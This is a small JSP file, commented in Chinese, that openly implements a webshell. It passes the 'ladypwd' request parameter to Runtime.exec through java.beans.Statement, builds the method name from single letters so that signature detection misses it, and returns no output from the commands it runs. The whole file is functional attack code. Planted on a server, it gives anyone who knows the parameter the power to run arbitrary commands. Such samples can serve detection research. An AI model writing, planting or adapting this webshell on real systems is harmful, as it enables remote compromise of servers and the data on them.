<%@ page import="java.beans.Statement" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
使用Statement#execute() 实现JSP Webshell
PS: 这种实现方式，命令无回显，因为execute()返回类型是void.
--%>
<%
    String cmd = request.getParameter("ladypwd");
    Statement stmt = new Statement(Runtime.getRuntime(), "e"+"x"+"e"+"c", new Object[]{cmd});
    stmt.execute();
%>
